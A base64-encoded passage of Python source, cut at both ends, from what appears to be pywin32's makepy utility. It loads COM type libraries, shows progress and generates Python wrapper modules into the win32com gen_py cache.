dyaXRlKFxuICAgICAgICAgICAgICAgICJXYXJuaW5nIC0gY291bGQgbm90IGxvYWQgcmVnaXN0ZXJlZCB0eXBlbGliIFwnJXNcJ1xcbiIgJSAodGxiU3BlYy5jbHNpZClcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIHRsYiA9IE5vbmVcblxuICAgICAgICBpbmZvcyA9IFsodGxiLCB0bGJTcGVjKV1cbiAgICBlbHNlOlxuICAgICAgICBpbmZvcyA9IEdldFR5cGVMaWJzRm9yU3BlYyhzcGVjKVxuICAgIGZvciAodGxiLCB0bGJTcGVjKSBpbiBpbmZvczpcbiAgICAgICAgZGVzYyA9IHRsYlNwZWMuZGVzY1xuICAgICAgICBpZiBkZXNjIGlzIE5vbmU6XG4gICAgICAgICAgICBpZiB0bGIgaXMgTm9uZTpcbiAgICAgICAgICAgICAgICBkZXNjID0gIjxDb3VsZCBub3QgbG9hZCB0eXBlbGliICVzPiIgJSAodGxiU3BlYy5kbGwpXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGRlc2MgPSB0bGIuR2V0RG9jdW1lbnRhdGlvbigtMSlbMF1cbiAgICAgICAgcHJpbnQoZGVzYylcbiAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAiICVzLCBsY2lkPSVzLCBtYWpvcj0lcywgbWlub3I9JXMiXG4gICAgICAgICAgICAlICh0bGJTcGVjLmNsc2lkLCB0bGJTcGVjLmxjaWQsIHRsYlNwZWMubWFqb3IsIHRsYlNwZWMubWlub3IpXG4gICAgICAgIClcbiAgICAgICAgcHJpbnQoIiA+Pj4gIyBVc2UgdGhlc2UgY29tbWFuZHMgaW4gUHl0aG9uIGNvZGUgdG8gYXV0byBnZW5lcmF0ZSAucHkgc3VwcG9ydCIpXG4gICAgICAgIHByaW50KCIgPj4+IGZyb20gd2luMzJjb20uY2xpZW50IGltcG9ydCBnZW5jYWNoZSIpXG4gICAgICAgIHByaW50KFxuICAgICAgICAgICAgIiA+Pj4gZ2VuY2FjaGUuRW5zdXJlTW9kdWxlKFwnJXNcJywgJXMsICVzLCAlcykiXG4gICAgICAgICAgICAlICh0bGJTcGVjLmNsc2lkLCB0bGJTcGVjLmxjaWQsIHRsYlNwZWMubWFqb3IsIHRsYlNwZWMubWlub3IpXG4gICAgICAgIClcblxuXG5jbGFzcyBTaW1wbGVQcm9ncmVzcyhnZW5weS5HZW5lcmF0b3JQcm9ncmVzcyk6XG4gICAgIiIiQSBzaW1wbGUgcHJvZ3Jlc3MgY2xhc3MgcHJpbnRzIGl0cyBvdXRwdXQgdG8gc3RkZXJyIiIiXG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgdmVyYm9zZUxldmVsKTpcbiAgICAgICAgc2VsZi52ZXJib3NlTGV2ZWwgPSB2ZXJib3NlTGV2ZWxcblxuICAgIGRlZiBDbG9zZShzZWxmKTpcbiAgICAgICAgcGFzc1xuXG4gICAgZGVmIEZpbmlzaGVkKHNlbGYpOlxuICAgICAgICBpZiBzZWxmLnZlcmJvc2VMZXZlbCA+IDE6XG4gICAgICAgICAgICBzeXMuc3RkZXJyLndyaXRlKCJHZW5lcmF0aW9uIGNvbXBsZXRlLi5cXG4iKVxuXG4gICAgZGVmIFNldERlc2NyaXB0aW9uKHNlbGYsIGRlc2MsIG1heHRpY2tzPU5vbmUpOlxuICAgICAgICBpZiBzZWxmLnZlcmJvc2VMZXZlbDpcbiAgICAgICAgICAgIHN5cy5zdGRlcnIud3JpdGUoZGVzYyArICJcXG4iKVxuXG4gICAgZGVmIFRpY2soc2VsZiwgZGVzYz1Ob25lKTpcbiAgICAgICAgcGFzc1xuXG4gICAgZGVmIFZlcmJvc2VQcm9ncmVzcyhzZWxmLCBkZXNjLCB2ZXJib3NlTGV2ZWw9Mik6XG4gICAgICAgIGlmIHNlbGYudmVyYm9zZUxldmVsID49IHZlcmJvc2VMZXZlbDpcbiAgICAgICAgICAgIHN5cy5zdGRlcnIud3JpdGUoZGVzYyArICJcXG4iKVxuXG4gICAgZGVmIExvZ0JlZ2luR2VuZXJhdGUoc2VsZiwgZmlsZW5hbWUpOlxuICAgICAgICBzZWxmLlZlcmJvc2VQcm9ncmVzcygiR2VuZXJhdGluZyB0byAlcyIgJSBmaWxlbmFtZSwgMSlcblxuICAgIGRlZiBMb2dXYXJuaW5nKHNlbGYsIGRlc2MpOlxuICAgICAgICBzZWxmLlZlcmJvc2VQcm9ncmVzcygiV0FSTklORzogIiArIGRlc2MsIDEpXG5cblxuY2xhc3MgR1VJUHJvZ3Jlc3MoU2ltcGxlUHJvZ3Jlc3MpOlxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB2ZXJib3NlTGV2ZWwpOlxuICAgICAgICAjIEltcG9ydCBzb21lIG1vZHVsZXMgd2UgbmVlZCB0byB3ZSBjYW4gdHJhcCBmYWlsdXJlIG5vdy5cbiAgICAgICAgaW1wb3J0IHdpbjMydWksIHB5d2luXG5cbiAgICAgICAgU2ltcGxlUHJvZ3Jlc3MuX19pbml0X18oc2VsZiwgdmVyYm9zZUxldmVsKVxuICAgICAgICBzZWxmLmRpYWxvZyA9IE5vbmVcblxuICAgIGRlZiBDbG9zZShzZWxmKTpcbiAgICAgICAgaWYgc2VsZi5kaWFsb2cgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICBzZWxmLmRpYWxvZy5DbG9zZSgpXG4gICAgICAgICAgICBzZWxmLmRpYWxvZyA9IE5vbmVcblxuICAgIGRlZiBTdGFydGluZyhzZWxmLCB0bGJfZGVzYyk6XG4gICAgICAgIFNpbXBsZVByb2dyZXNzLlN0YXJ0aW5nKHNlbGYsIHRsYl9kZXNjKVxuICAgICAgICBpZiBzZWxmLmRpYWxvZyBpcyBOb25lOlxuICAgICAgICAgICAgZnJvbSBweXdpbi5kaWFsb2dzIGltcG9ydCBzdGF0dXNcblxuICAgICAgICAgICAgc2VsZi5kaWFsb2cgPSBzdGF0dXMuVGhyZWFkZWRTdGF0dXNQcm9ncmVzc0RpYWxvZyh0bGJfZGVzYylcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHNlbGYuZGlhbG9nLlNldFRpdGxlKHRsYl9kZXNjKVxuXG4gICAgZGVmIFNldERlc2NyaXB0aW9uKHNlbGYsIGRlc2MsIG1heHRpY2tzPU5vbmUpOlxuICAgICAgICBzZWxmLmRpYWxvZy5TZXRUZXh0KGRlc2MpXG4gICAgICAgIGlmIG1heHRpY2tzOlxuICAgICAgICAgICAgc2VsZi5kaWFsb2cuU2V0TWF4VGlja3MobWF4dGlja3MpXG5cbiAgICBkZWYgVGljayhzZWxmLCBkZXNjPU5vbmUpOlxuICAgICAgICBzZWxmLmRpYWxvZy5UaWNrKClcbiAgICAgICAgaWYgZGVzYyBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHNlbGYuZGlhbG9nLlNldFRleHQoZGVzYylcblxuXG5kZWYgR2V0VHlwZUxpYnNGb3JTcGVjKGFyZyk6XG4gICAgIiIiR2l2ZW4gYW4gYXJndW1lbnQgb24gdGhlIGNvbW1hbmQgbGluZSAoZWl0aGVyIGEgZmlsZSBuYW1lLCBsaWJyYXJ5XG4gICAgZGVzY3JpcHRpb24sIG9yIFByb2dJRCBvZiBhbiBvYmplY3QpIHJldHVybiBhIGxpc3Qgb2YgYWN0dWFsIHR5cGVsaWJzXG4gICAgdG8gdXNlLiIiIlxuICAgIHR5cGVsaWJzID0gW11cbiAgICB0cnk6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHRsYiA9IHB5dGhvbmNvbS5Mb2FkVHlwZUxpYihhcmcpXG4gICAgICAgICAgICBzcGVjID0gc2VsZWN0dGxiLlR5cGVsaWJTcGVjKE5vbmUsIDAsIDAsIDApXG4gICAgICAgICAgICBzcGVjLkZyb21UeXBlbGliKHRsYiwgYXJnKVxuICAgICAgICAgICAgdHlwZWxpYnMuYXBwZW5kKCh0bGIsIHNwZWMpKVxuICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgICAgICMgU2VlIGlmIGl0IGlzIGEgZGVzY3JpcHRpb25cbiAgICAgICAgICAgIHRsYnMgPSBzZWxlY3R0bGIuRmluZFRsYnNXaXRoRGVzY3JpcHRpb24oYXJnKVxuICAgICAgICAgICAgaWYgbGVuKHRsYnMpID09IDA6XG4gICAgICAgICAgICAgICAgIyBNYXliZSBpdCBpcyB0aGUgbmFtZSBvZiBhIENPTSBvYmplY3Q/XG4gICAgICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgICAgICBvYiA9IERpc3BhdGNoKGFyZylcbiAgICAgICAgICAgICAgICAgICAgIyBhbmQgaWYgc28sIGl0IG11c3Qgc3VwcG9ydCB0eXBlbGliIGluZm9cbiAgICAgICAgICAgICAgICAgICAgdGxiLCBpbmRleCA9IG9iLl9vbGVvYmpfLkdldFR5cGVJbmZvKCkuR2V0Q29udGFpbmluZ1R5cGVMaWIoKVxuICAgICAgICAgICAgICAgICAgICBzcGVjID0gc2VsZWN0dGxiLlR5cGVsaWJTcGVjKE5vbmUsIDAsIDAsIDApXG4gICAgICAgICAgICAgICAgICAgIHNwZWMuRnJvbVR5cGVsaWIodGxiKVxuICAgICAgICAgICAgICAgICAgICB0bGJzLmFwcGVuZChzcGVjKVxuICAgICAgICAgICAgICAgIGV4Y2VwdCBweXRob25jb20uY29tX2Vycm9yOlxuICAgICAgICAgICAgICAgICAgICBwYXNzXG4gICAgICAgICAgICBpZiBsZW4odGxicykgPT0gMDpcbiAgICAgICAgICAgICAgICBwcmludCgiQ291bGQgbm90IGxvY2F0ZSBhIHR5cGUgbGlicmFyeSBtYXRjaGluZyBcJyVzXCciICUgKGFyZykpXG4gICAgICAgICAgICBmb3Igc3BlYyBpbiB0bGJzOlxuICAgICAgICAgICAgICAgICMgVmVyc2lvbiBudW1iZXJzIG5vdCBhbHdheXMgcmVsaWFibGUgaWYgZW51bWVyYXRlZCBmcm9tIHJlZ2lzdHJ5LlxuICAgICAgICAgICAgICAgICMgKGFzIHNvbWUgbGlicyB1c2UgaGV4LCBvdGhlclwncyBkb250LiAgQm90aCBleGFtcGxlcyBmcm9tIE1TLCBvZiBjb3Vyc2UuKVxuICAgICAgICAgICAgICAgIGlmIHNwZWMuZGxsIGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgICAgIHRsYiA9IHB5dGhvbmNvbS5Mb2FkUmVnVHlwZUxpYihcbiAgICAgICAgICAgICAgICAgICAgICAgIHNwZWMuY2xzaWQsIHNwZWMubWFqb3IsIHNwZWMubWlub3IsIHNwZWMubGNpZFxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgdGxiID0gcHl0aG9uY29tLkxvYWRUeXBlTGliKHNwZWMuZGxsKVxuXG4gICAgICAgICAgICAgICAgIyBXZSBoYXZlIGEgdHlwZWxpYiwgYnV0IGl0IG1heSBub3QgYmUgZXhhY3RseSB3aGF0IHdlIHNwZWNpZmllZFxuICAgICAgICAgICAgICAgICMgKGR1ZSB0byBhdXRvbWF0aWMgdmVyc2lvbiBtYXRjaGluZyBvZiBDT00pLiAgU28gd2UgcXVlcnkgd2hhdCB3ZSByZWFsbHkgaGF2ZSFcbiAgICAgICAgICAgICAgICBhdHRyID0gdGxiLkdldExpYkF0dHIoKVxuICAgICAgICAgICAgICAgIHNwZWMubWFqb3IgPSBhdHRyWzNdXG4gICAgICAgICAgICAgICAgc3BlYy5taW5vciA9IGF0dHJbNF1cbiAgICAgICAgICAgICAgICBzcGVjLmxjaWQgPSBhdHRyWzFdXG4gICAgICAgICAgICAgICAgdHlwZWxpYnMuYXBwZW5kKCh0bGIsIHNwZWMpKVxuICAgICAgICByZXR1cm4gdHlwZWxpYnNcbiAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgdCwgdiwgdGIgPSBzeXMuZXhjX2luZm8oKVxuICAgICAgICBzeXMuc3RkZXJyLndyaXRlKCJVbmFibGUgdG8gbG9hZCB0eXBlIGxpYnJhcnkgZnJvbSBcJyVzXCcgLSAlc1xcbiIgJSAoYXJnLCB2KSlcbiAgICAgICAgdGIgPSBOb25lICAjIFN0b3JpbmcgdGIgaW4gYSBsb2NhbCBpcyBhIGN5Y2xlIVxuICAgICAgICBzeXMuZXhpdCgxKVxuXG5cbmRlZiBHZW5lcmF0ZUZyb21UeXBlTGliU3BlYyhcbiAgICB0eXBlbGliSW5mbyxcbiAgICBmaWxlPU5vbmUsXG4gICAgdmVyYm9zZUxldmVsPU5vbmUsXG4gICAgcHJvZ3Jlc3NJbnN0YW5jZT1Ob25lLFxuICAgIGJVbmljb2RlVG9TdHJpbmc9Tm9uZSxcbiAgICBiRm9yRGVtYW5kPWJGb3JEZW1hbmREZWZhdWx0LFxuICAgIGJCdWlsZEhpZGRlbj0xLFxuKTpcbiAgICBhc3NlcnQgYlVuaWNvZGVUb1N0cmluZyBpcyBOb25lLCAidGhpcyBpcyBkZXByZWNhdGVkIGFuZCB3aWxsIGdvIGF3YXkiXG4gICAgaWYgdmVyYm9zZUxldmVsIGlzIE5vbmU6XG4gICAgICAgIHZlcmJvc2VMZXZlbCA9IDAgICMgQnkgZGVmYXVsdCwgd2UgdXNlIG5vIGd1aSBhbmQgbm8gdmVyYm9zZSBsZXZlbCFcblxuICAgIGlmIGJGb3JEZW1hbmQgYW5kIGZpbGUgaXMgbm90IE5vbmU6XG4gICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihcbiAgICAgICAgICAgICJZb3UgY2FuIG9ubHkgcGVyZm9ybSBhIGRlbWFuZC1idWlsZCB3aGVuIHRoZSBvdXRwdXQgZ29lcyB0byB0aGUgZ2VuX3B5IGRpcmVjdG9yeSJcbiAgICAgICAgKVxuICAgIGlmIGlzaW5zdGFuY2UodHlwZWxpYkluZm8sIHR1cGxlKTpcbiAgICAgICAgIyBUdXBsZVxuICAgICAgICB0eXBlbGliQ0xTSUQsIGxjaWQsIG1ham9yLCBtaW5vciA9IHR5cGVsaWJJbmZvXG4gICAgICAgIHRsYiA9IHB5dGhvbmNvbS5Mb2FkUmVnVHlwZUxpYih0eXBlbGliQ0xTSUQsIG1ham9yLCBtaW5vciwgbGNpZClcbiAgICAgICAgc3BlYyA9IHNlbGVjdHRsYi5UeXBlbGliU3BlYyh0eXBlbGliQ0xTSUQsIGxjaWQsIG1ham9yLCBtaW5vcilcbiAgICAgICAgc3BlYy5Gcm9tVHlwZWxpYih0bGIsIHN0cih0eXBlbGliQ0xTSUQpKVxuICAgICAgICB0eXBlbGlicyA9IFsodGxiLCBzcGVjKV1cbiAgICBlbGlmIGlzaW5zdGFuY2UodHlwZWxpYkluZm8sIHNlbGVjdHRsYi5UeXBlbGliU3BlYyk6XG4gICAgICAgIGlmIHR5cGVsaWJJbmZvLmRsbCBpcyBOb25lOlxuICAgICAgICAgICAgIyBWZXJzaW9uIG51bWJlcnMgbm90IGFsd2F5cyByZWxpYWJsZSBpZiBlbnVtZXJhdGVkIGZyb20gcmVnaXN0cnkuXG4gICAgICAgICAgICB0bGIgPSBweXRob25jb20uTG9hZFJlZ1R5cGVMaWIoXG4gICAgICAgICAgICAgICAgdHlwZWxpYkluZm8uY2xzaWQsXG4gICAgICAgICAgICAgICAgdHlwZWxpYkluZm8ubWFqb3IsXG4gICAgICAgICAgICAgICAgdHlwZWxpYkluZm8ubWlub3IsXG4gICAgICAgICAgICAgICAgdHlwZWxpYkluZm8ubGNpZCxcbiAgICAgICAgICAgIClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHRsYiA9IHB5dGhvbmNvbS5Mb2FkVHlwZUxpYih0eXBlbGliSW5mby5kbGwpXG4gICAgICAgIHR5cGVsaWJzID0gWyh0bGIsIHR5cGVsaWJJbmZvKV1cbiAgICBlbGlmIGhhc2F0dHIodHlwZWxpYkluZm8sICJHZXRMaWJBdHRyIik6XG4gICAgICAgICMgQSByZWFsIHR5cGVsaWIgb2JqZWN0IVxuICAgICAgICAjIENvdWxkIGFsc28gdXNlIGlzaW5zdGFuY2UodHlwZWxpYkluZm8sIFB5SVR5cGVMaWIpIGluc3RlYWQsIGJ1dCBQeUlUeXBlTGliIGlzIG5vdCBkaXJlY3RseSBleHBvc2VkIGJ5IHB5dGhvbmNvbS5cbiAgICAgICAgIyBcdHB5dGhvbmNvbS5UeXBlSUlEc1tweXRob25jb20uSUlEX0lUeXBlTGliXSBzZWVtcyB0byB3b3JrXG4gICAgICAgIHRsYSA9IHR5cGVsaWJJbmZvLkdldExpYkF0dHIoKVxuICAgICAgICBndWlkID0gdGxhWzBdXG4gICAgICAgIGxjaWQgPSB0bGFbMV1cbiAgICAgICAgbWFqb3IgPSB0bGFbM11cbiAgICAgICAgbWlub3IgPSB0bGFbNF1cbiAgICAgICAgc3BlYyA9IHNlbGVjdHRsYi5UeXBlbGliU3BlYyhndWlkLCBsY2lkLCBtYWpvciwgbWlub3IpXG4gICAgICAgIHR5cGVsaWJzID0gWyh0eXBlbGliSW5mbywgc3BlYyldXG4gICAgZWxzZTpcbiAgICAgICAgdHlwZWxpYnMgPSBHZXRUeXBlTGlic0ZvclNwZWModHlwZWxpYkluZm8pXG5cbiAgICBpZiBwcm9ncmVzc0luc3RhbmNlIGlzIE5vbmU6XG4gICAgICAgIHByb2dyZXNzSW5zdGFuY2UgPSBTaW1wbGVQcm9ncmVzcyh2ZXJib3NlTGV2ZWwpXG4gICAgcHJvZ3Jlc3MgPSBwcm9ncmVzc0luc3RhbmNlXG5cbiAgICBiVG9HZW5EaXIgPSBmaWxlIGlzIE5vbmVcblxuICAgIGZvciB0eXBlbGliLCBpbmZvIGluIHR5cGVsaWJzOlxuICAgICAgICBnZW4gPSBnZW5weS5HZW5lcmF0b3IodHlwZWxpYiwgaW5mby5kbGwsIHByb2dyZXNzLCBiQnVpbGRIaWRkZW49YkJ1aWxkSGlkZGVuKVxuXG4gICAgICAgIGlmIGZpbGUgaXMgTm9uZTpcbiAgICAgICAgICAgIHRoaXNfbmFtZSA9IGdlbmNhY2hlLkdldEdlbmVyYXRlZEZpbGVOYW1lKFxuICAgICAgICAgICAgICAgIGluZm8uY2xzaWQsIGluZm8ubGNpZCwgaW5mby5tYWpvciwgaW5mby5taW5vclxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgZnVsbF9uYW1lID0gb3MucGF0aC5qb2luKGdlbmNhY2hlLkdldEdlbmVyYXRlUGF0aCgpLCB0aGlzX25hbWUpXG4gICAgICAgICAgICBpZiBiRm9yRGVtYW5kOlxuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgb3MudW5saW5rKGZ1bGxfbmFtZSArICIucHkiKVxuICAgICAgICAgICAgICAgIGV4Y2VwdCBvcy5lcnJvcjpcbiAgICAgICAgICAgICAgICAgICAgcGFzc1xuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgb3MudW5saW5rKGZ1bGxfbmFtZSArICIucHljIilcbiAgICAgICAgICAgICAgICBleGNlcHQgb3MuZXJyb3I6XG4gICAgICAgICAgICAgICAgICAgIHBhc3NcbiAgICAgICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgICAgIG9zLnVubGluayhmdWxsX25hbWUgKyAiLnB5byIpXG4gICAgICAgICAgICAgICAgZXhjZXB0IG9zLmVycm9yOlxuICAgICAgICAgICAgICAgICAgICBwYXNzXG4gICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIoZnVsbF9uYW1lKTpcbiAgICAgICAgICAgICAgICAgICAgb3MubWtkaXIoZnVsbF9uYW1lKVxuICAgICAgICAgICAgICAgIG91dHB1dE5hbWUgPSBvcy5wYXRoLmpvaW4oZnVsbF9uYW1lLCAiX19pbml0X18ucHkiKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBvdXRwdXROYW1lID0gZnVsbF9uYW1lICsgIi5weSJcbiAgICAgICAgICAgIGZpbGVVc2UgPSBnZW4ub3Blbl93cml0ZXIob3V0cHV0TmFtZSlcbiAgICAgICAgICAgIHByb2dyZXNzLkxvZ0JlZ2luR2VuZXJhdGUob3V0cHV0TmFtZSlcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGZpbGVVc2UgPSBmaWxlXG5cbiAgICAgICAgd29ya2VkID0gRmFsc2VcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgZ2VuLmdlbmVyYXRlKGZpbGVVc2UsIGJGb3JEZW1hbmQpXG4gICAgICAgICAgICB3b3JrZWQgPSBUcnVlXG4gICAgICAgIGZpbmFsbHk6XG4gICAgICAgICAgICBpZiBmaWxlIGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgZ2VuLmZpbmlzaF93cml0ZXIob3V0cHV0TmFtZSwgZmlsZVVzZSwgd29ya2VkKVxuICAgICAgICBpbXBvcnRsaWIuaW52YWxpZGF0ZV9jYWNoZXMoKVxuICAgICAgICBpZiBiVG9HZW5EaXI6XG4gICAgICAgICAgICBwcm9ncmVzcy5TZXREZXNjcmlwdGlvbigiSW1wb3J0aW5nIG1vZHVsZSIpXG4gICAgICAgICAgICBnZW5jYWNoZS5BZGRNb2R1bGVUb0NhY2hlKGluZm8uY2xzaWQsIGluZm8ubGNpZCwgaW5mby5tYWpvciwgaW5mby5taW5vcilcblxuICAgIHByb2dyZXNzLkNsb3NlKClcblxuXG5kZWYgR2VuZXJhdGVDaGlsZEZyb21UeXBlTGliU3BlYyhcbiAgICBjaGlsZCwgdHlwZWxpYkluZm8sIHZlcmJvc2VMZXZlbD1Ob25lLCBwcm9ncmVzc0luc3RhbmNlPU5vbmUsIGJVbmljb2RlVG9TdHJpbmc9Tm9uZVxuKTpcbiAgICBhc3NlcnQgYlVuaWNvZGVUb1N0cmluZyBpcyBOb25lLCAidGhpcyBpcyBkZXByZWNhdGVkIGFuZCB3aWxsIGdvIGF3YXkiXG4gICAgaWYgdmVyYm9zZUxldmVsIGlzIE5vbmU6XG4gICAgICAgIHZlcmJvc2VMZXZlbCA9IChcbiAgICAgICAgICAgIDAgICMgQnkgZGVmYXVsdCwgd2UgdXNlIG5vIGd1aSwgYW5kIG5vIHZlcmJvc2UgbGV2ZWwgZm9yIHRoZSBjaGlsZHJlbi5cbiAgICAgICAgKVxuICAgIGlmIHR5cGUodHlwZWxpYkluZm8pID09IHR5cGUoKCkpOlxuICAgICAgICB0eXBlbGliQ0xTSUQsIGxjaWQsIG1ham9yLCBtaW5vciA9IHR5cGVsaWJJbmZvXG4gICAgICAgIHRsYiA9IHB5dGhvbmNvbS5Mb2FkUmVnVHlwZUxpYih0eXBlbGliQ0xTSUQsIG1ham9yLCBtaW5vciwgbGNpZClcbiAgICBlbHNlOlxuICAgICAgICB0bGIgPSB0eXBlbGliSW5mb1xuICAgICAgICB0bGEgPSB0eXBlbGliSW5mby5HZXRMaWJBdHRyKClcbiAgICAgICAgdHlwZWxpYkNMU0lEID0gdGxhWzBdXG4gICAgICAgIGxjaWQgPSB0bGFbMV1cbiAgICAgICAgbWFqb3IgPSB0bGFbM11cbiAgICAgICAgbWlub3IgPSB0bGFbNF1cbiAgICBzcGVjID0gc2VsZWN0dGxiLlR5cGVsaWJTcGVjKHR5cGVsaWJDTFNJRCwgbGNpZCwgbWFqb3IsIG1pbm9yKVxuICAgIHNwZWMuRnJvbVR5cGVsaWIodGxiLCBzdHIodHlwZWxpYkNMU0lEKSlcbiAgICB0eXBlbGlicyA9IFsodGxiLCBzcGVjKV1cblxuICAgIGlmIHByb2dyZXNzSW5zdGFuY2UgaXMgTm9uZTpcbiAgICAgICAgcHJvZ3Jlc3NJbnN0YW5jZSA9IFNpbXBsZVByb2dyZXNzKHZlcmJvc2VMZXZlbClcbiAgICBwcm9ncmVzcyA9IHByb2dyZXNzSW5zdGFuY2VcblxuICAgIGZvciB0eXBlbGliLCBpbmZvIGluIHR5cGVsaWJzOlxuICAgICAgICBkaXJfbmFtZSA9IGdlbmNhY2hlLkdldEdlbmVyYXRlZEZpbGVOYW1lKFxuICAgICAgICAgICAgaW5mby5jbHNpZCwgaW5mby5sY2lkLCBpbmZvLm1ham9yLCBpbmZvLm1pbm9yXG4gICAgICAgIClcbiAgICAgICAgZGlyX3BhdGhfbmFtZSA9IG9zLnBhdGguam9pbihnZW5jYWNoZS5HZXRHZW5lcmF0ZVBhdGgoKSwgZGlyX25hbWUpXG4gICAgICAgIHByb2dyZXNzLkxvZ0JlZ2luR2VuZXJhdGUoZGlyX3BhdGhfbmFtZSlcblxuICAgICAgICBnZW4gPSBnZW5weS5HZW5lcmF0b3IodHlwZWxpYiwgaW5mby5kbGwsIHByb2dyZXNzKVxuICAgICAgICBnZW4uZ2VuZXJhdGVfY2hpbGQoY2hpbGQsIGRpcl9wYXRoX25hbWUpXG4gICAgICAgIHByb2dyZXNzLlNldERlc2NyaXB0aW9uKCJJbXBvcnRpbmcgbW9kdWxlIilcbiAgICAgICAgaW1wb3J0bGliLmludmFsaWRhdGVfY2FjaGVzKClcbiAgICAgICAgX19pbXBvcnRfXygid2luMzJjb20uZ2VuX3B5LiIgKyBkaXJfbmFtZSArICIuIiArIGNoaWxkKVxuICAgIHByb2dyZXNzLkNsb3NlKClcblxuXG5kZWYgbWFpbigpOlxuICAgIGltcG9ydCBnZXRvcHRcblxuICAgIGhpZGRlblNwZWMgPSAxXG4gICAgb3V0cHV0TmFtZSA9IE5vbmVcbiAgICB2ZXJib3NlTGV2ZWwgPSAxXG4gICAgZG9pdCA9IDFcbiAgICBiRm9yRGVtYW5kID0gYkZvckRlbWFuZERlZmF1bHRcbiAgICB0cnk6XG4gICAgICAgIG9wdHMsIGFyZ3MgPSBnZXRvcHQuZ2V0b3B0KHN5cy5hcmd2WzE6XSwgInZvOmh1aXFkIilcbiAgICAgICAgZm9yIG8sIHYgaW4gb3B0czpcbiAgICAgICAgICAgIGlmIG8gPT0gIi1oIjpcbiAgICAgICAgICAgICAgICBoaWRkZW5TcGVjID0gMFxuICAgICAgICAgICAgZWxpZiBvID09ICItbyI6XG4gICAgICAgICAgICAgICAgb3V0cHV0TmFtZSA9IHZcbiAgICAgICAgICAgIGVsaWYgbyA9PSAiLXYiOlxuICAgICAgICAgICAgICAgIHZlcmJvc2VMZXZlbCA9IHZlcmJvc2VMZXZlbCArIDFcbiAgICAgICAgICAgIGVsaWYgbyA9PSAiLXEiOlxuICAgICAgICAgICAgICAgIHZlcmJvc2VMZXZlbCA9IHZlcmJvc2VMZXZlbCAtIDFcbiAgICAgICAgICAgIGVsaWYgbyA9PSAiLWkiOlxuICAgICAgICAgICAgICAgIGlmIGxlbihhcmdzKSA9PSAwOlxuICAgICAgICAgICAgICAgICAgICBTaG93SW5mbyhOb25lKVxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIGZvciBhcmcgaW4gYXJnczpcbiAgICAgICAgICAgICAgICAgICAgICAgIFNob3dJbmZvKGFyZylcbiAgICAgICAgICAgICAgICBkb2l0ID0gMFxuICAgICAgICAgICAgZWxpZiBvID09ICItZCI6XG4gICAgICAgICAgICAgICAgYkZvckRlbWFuZCA9IG5vdCBiRm9yRGVtYW5kXG5cbiAgICBleGNlcHQgKGdldG9wdC5lcnJvciwgZXJyb3IpIGFzIG1zZzpcbiAgICAgICAgc3lzLnN0ZGVyci53cml0ZShzdHIobXNnKSArICJcXG4iKVxuICAgICAgICB1c2FnZSgpXG5cbiAgICBpZiBiRm9yRGVtYW5kIGFuZCBvdXRwdXROYW1lIGlzIG5vdCBOb25lOlxuICAgICAgICBzeXMuc3RkZXJyLndyaXRlKCJDYW4gbm90IHVzZSAtZCBhbmQgLW8gdG9nZXRoZXJcXG4iKVxuICAgICAgICB1c2FnZSgpXG5cbiAgICBpZiBub3QgZG9pdDpcbiAgICAgICAgcmV0dXJuIDBcbiAgICBpZiBsZW4oYXJncykgPT0gMDpcbiAgICAgICAgcmMgPSBzZWxlY3R0bGIuU2VsZWN0VGxiKClcbiAgICAgICAgaWYgcmMgaXMgTm9uZTpcbiAgICAgICAgICAgIHN5cy5leGl0KDEpXG4gICAgICAgIGFyZ3MgPSBbcmNdXG5cbiAgICBpZiBvdXRwdXROYW1lIGlzIG5vdCBOb25lOlxuICAgICAgICBwYXRoID0gb3MucGF0aC5kaXJuYW1lKG91dHB1dE5hbWUpXG4gICAgICAgIGlmIHBhdGggIT0gIiIgYW5kIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTpcbiAgICAgICAgICAgIG9zLm1ha2VkaXJzKHBhdGgpXG4gICAgICAgIGlmIHN5cy52ZXJzaW9uX2luZm8gPiAoMywgMCk6XG4gICAgICAgICAgICBmID0gb3BlbihvdXRwdXROYW1lLCAid3QiLCBlbmNvZGluZz0ibWJjcyIpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBpbXBvcnQgY29kZWNzICAjIG5vdCBhdmFpbGFibGUgaW4gcHkzay5cblxuICAgICAgICAgICAgZiA9IGNvZGVjcy5vcGVuKG91dHB1dE5hbWUsICJ3IiwgIm1iY3MiKVxuICAgIGVsc2U6XG4gICAgICAgIGYgPSBOb25lXG5cbiAgICBmb3IgYXJnIGluIGFyZ3M6XG4gICAgICAgIEdlbmVyYXRlRnJvbVR5cGVMaWJTcGVjKFxuICAgICAgICAgICAgYXJnLFxuICAgICAgICAgICAgZixcbiAgICAgICAgICAgIHZlcmJvc2VMZXZlbD12ZXJib3NlTGV2ZWwsXG4gICAgICAgICAgICBiRm9yRGVtYW5kPWJGb3JEZW1hbmQsXG4gICAgICA